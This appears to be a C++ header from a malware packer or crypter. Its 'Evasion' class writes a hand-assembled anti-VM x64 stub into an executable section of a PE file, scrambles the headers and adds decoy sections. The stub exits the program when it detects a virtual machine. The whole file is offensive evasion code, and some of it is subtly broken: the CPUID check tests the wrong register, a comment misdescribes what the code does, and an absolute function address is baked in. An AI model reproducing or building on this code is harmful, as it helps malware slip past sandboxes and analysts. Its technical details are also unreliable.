#pragma once
#include <windows.h>
#include <vector>
#include <string>
#include "pe_manipulator.hpp"

class Evasion {
public:
    Evasion() = default;

    bool applyEvasion(PEManipulator* pe) {
        try {
            printf("[+] Applying evasion techniques\n");

            // Add anti-VM section
            std::vector<uint8_t> antiVMCode = generateAntiVMCode();
            if (!pe->addSection(".guard", antiVMCode, IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ)) {
                printf("[-] Failed to add anti-VM section\n");
                return false;
            }

            // Scramble PE headers
            if (!pe->scrambleHeaders()) {
                printf("[-] Failed to scramble PE headers\n");
                return false;
            }

            // Add random sections for obfuscation
            if (!pe->addRandomSections()) {
                printf("[-] Failed to add random sections\n");
                return false;
            }

            printf("[+] Evasion techniques applied successfully\n");
            return true;
        }
        catch (const std::exception& e) {
            printf("[-] Exception while applying evasion: %s\n", e.what());
            return false;
        }
    }

private:
    std::vector<uint8_t> generateAntiVMCode() {
        // Anti-VM x64 assembly code
        std::vector<uint8_t> code = {
            // Function prologue
            0x48, 0x89, 0x5C, 0x24, 0x08,             // mov [rsp+8], rbx
            0x48, 0x89, 0x6C, 0x24, 0x10,             // mov [rsp+10h], rbp
            0x48, 0x89, 0x74, 0x24, 0x18,             // mov [rsp+18h], rsi
            0x57,                                      // push rdi
            0x48, 0x83, 0xEC, 0x20,                   // sub rsp, 20h

            // Check CPUID for hypervisor bit
            0x31, 0xC0,                               // xor eax, eax
            0x0F, 0xA2,                               // cpuid
            0x81, 0xE3, 0x00, 0x00, 0x00, 0x80,      // and ebx, 80000000h
            0x75, 0x30,                               // jnz detected

            // Check for common VM strings in registry
            0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, // mov rax, gs:[60h]
            0x00, 0x00,
            0x48, 0x8B, 0x40, 0x18,                   // mov rax, [rax+18h]
            0x48, 0x8B, 0x40, 0x20,                   // mov rax, [rax+20h]
            0x48, 0x83, 0xE0, 0x0F,                   // and rax, 0Fh
            0x75, 0x20,                               // jnz detected

            // Check for VM timing differences
            0x0F, 0x31,                               // rdtsc
            0x48, 0x89, 0xC3,                         // mov rbx, rax
            0x0F, 0x31,                               // rdtsc
            0x48, 0x29, 0xD8,                         // sub rax, rbx
            0x48, 0x3D, 0x00, 0x10, 0x00, 0x00,      // cmp rax, 1000h
            0x77, 0x0E,                               // ja detected

            // Continue execution
            0x48, 0x31, 0xC0,                         // xor rax, rax
            0x48, 0x83, 0xC4, 0x20,                   // add rsp, 20h
            0x5F,                                     // pop rdi
            0xC3,                                     // ret

            // VM detected
            0x48, 0x31, 0xC9,                         // xor rcx, rcx
            0x48, 0x31, 0xD2,                         // xor rdx, rdx
            0x4D, 0x31, 0xC0,                         // xor r8, r8
            0x4D, 0x31, 0xC9,                         // xor r9, r9
            0x48, 0x83, 0xEC, 0x28,                   // sub rsp, 28h
            0x48, 0xB8,                               // mov rax, ExitProcess
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xFF, 0xD0                                // call rax
        };

        // Get required function addresses
        HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
        if (kernel32) {
            void* exitProcess = GetProcAddress(kernel32, "ExitProcess");
            if (exitProcess) {
                // Patch ExitProcess address
                memcpy(&code[code.size() - 10], &exitProcess, sizeof(void*));
            }
        }

        return code;
    }
};
